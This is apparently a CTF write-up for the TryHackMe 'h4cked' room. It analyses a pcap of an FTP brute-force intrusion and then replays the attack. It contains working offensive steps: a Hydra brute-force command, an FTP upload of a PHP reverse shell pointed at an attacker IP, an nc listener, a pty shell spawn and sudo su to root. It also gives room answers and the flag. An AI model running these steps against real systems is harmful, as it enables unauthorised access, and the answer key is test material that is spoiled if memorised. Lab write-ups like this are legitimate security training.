---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - defensive
  - traffic-analysis
  - brute-force
  - sudo-abuse
---

# h4cked
![h4cked logo](logos/h4cked_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [h4cked](https://tryhackme.com/room/h4cked)  

## Description
"Find out what happened by analysing a .pcap file and hack your way back into the machine "

## Environment and Artifacts provided
.pcap file ("Capture_1612220005488.pcapng")

## Task 1: 
"It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it."
### Artifacts examined
Capture_1612220005488.pcapng
### Analysis
* Open .pcap file in `Wireshark`  
* Statistics > Protocol Hierarchy for traffic analysis to show protocol(s) in use  
* Use display filter `ftp` to show brute force attack attempts (username and passwords)  
* Use display filter `ftp.response.code == 230` to show successful login packets. Richt-click packet > Follow > TCP Stream to show successful credentials and command transcript  
* File > Export Objects > FTP-DATA to extract "shell.php". Contents of file can then be read with `cat`  
* Use display filter `ip.src == 192.168.0.147` (found in `shell.php`) > right-click on first packet following `GET` request to `shell.php` > Follow > TCP Stream to find command transcript  
* [Research into Reptile software](https://ice-wzl.medium.com/reptile-the-ultimate-rootkit-full-guide-857efedb3078)
### Answers
??? success "The attacker is trying to log into a specific service. What service is this?"
	FTP
??? success "There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?"
	Hydra
??? success "The attacker is trying to log on with a specific username. What is the username?"
	jenny
??? success "What is the user's password?"
	password123
??? success "What is the current FTP working directory after the attacker logged in?"
	/var/www/html
??? success "The attacker uploaded a backdoor. What is the backdoor's filename?"
	shell.php
??? success "The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?"
	http://pentestmonkey.net/tools/php-reverse-shell
??? success "Which command did the attacker manually execute after getting a reverse shell?"
	`whoami`
??? success "What is the computer's hostname?"
	wir3
??? success "Which command did the attacker execute to spawn a new TTY shell?"
	`python3 -c 'import pty; pty.spawn("/bin/bash")'`
??? success "Which command was executed to gain a root shell?"
	`sudo su`
??? success "The attacker downloaded something from GitHub. What is the name of the GitHub project?"
	reptile
??? success "The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?"
	rootkit

## Task 2:
"The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!"
### Foothold
```
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP_ADDRESS
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-20 17:13:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://TARGET_IP_ADDRESS:21/
[21][ftp] host: 10.129.139.247   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-20 17:14:00
```
**Action(s)**  
:white_check_mark: Update IP address in `shell.php` to ATTACKER_IP_ADDRESS  
:white_check_mark: Update port in `shell.php` to "4444"  
```
ftp TARGET_IP_ADDRESS
Connected to TARGET_IP_ADDRESS.
220 Hello FTP World!
Name (ATTACKER_IP_ADDRESS:kali): jenny
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> send shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||47882|)
150 Ok to send data.
100% |**********************************************************************************************************************************|  5497        4.25 MiB/s    00:00 ETA
226 Transfer complete.
5497 bytes sent in 00:00 (120.33 KiB/s)
ftp> chmod 777 shell.php
200 SITE CHMOD command ok.
ftp> bye

nc -lvnp 4444
```
**Action(s)**  
:white_check_mark: Navigate to http://TARGET_IP_ADDRESS/shell.php in web browser  
*Reverse shell connection received*  
### Privilege Escalation
```
Connection received on TARGET_IP_ADDRESS 33180
Linux ip-TARGET_IP_ADDRESS 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 21:16:57 up 6 min,  0 users,  load average: 0.02, 0.21, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@ip-TARGET_IP_ADDRESS:/$ su jenny
Password: 987654321

jenny@ip-TARGET_IP_ADDRESS:/$ sudo su
[sudo] password for jenny: 987654321


root@ip-TARGET_IP_ADDRESS:/# cat /root/Reptile/flag.txt
```
### Answer
??? success "Read the flag.txt file inside the Reptile directory"
	ebcefd66ca4b559d17b440b6e67fd0fd

**Tools Used**  
`Wireshark` `hydra` `ftp`

**Date completed:** 20/05/26  
**Date published:** 21/05/26